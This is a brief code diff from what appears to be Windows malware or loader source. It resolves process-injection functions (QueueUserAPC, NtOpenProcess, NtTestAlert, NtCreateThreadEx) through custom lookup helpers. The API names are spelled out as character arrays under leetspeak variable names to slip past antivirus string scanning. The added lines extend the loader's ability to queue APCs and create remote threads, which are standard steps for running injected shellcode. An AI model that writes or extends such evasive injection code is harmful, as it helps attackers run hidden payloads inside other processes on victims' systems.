@@ -36,4 +36,10 @@ char qu3u3[] = { 'Q','u','e','u','e','U','s','e','r','A','P','C',0 };
 myQueueUserAPC pQueueUserAPC = (myQueueUserAPC)hlpGetProcAddress(hlpGetModuleHandle(k3rn3l), qu3u3);
 
 char Op3npr0[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s',0 };
-myNtOpenProcess pOpenProcess = (myNtOpenProcess)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), Op3npr0);
+myNtOpenProcess pOpenProcess = (myNtOpenProcess)hlpGetProcAddress(dllModule, Op3npr0);
+
+char t3stAl3rt[] = { 'N','t','T','e','s','t','A','l','e','r','t',0 };
+myNtTestAlert testAlert = (myNtTestAlert)hlpGetProcAddress(dllModule, t3stAl3rt);
+
+char ThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
+myNtCreateThreadEx pRemoteThread = (myNtCreateThreadEx)hlpGetProcAddress(dllModule, ThreadEx);
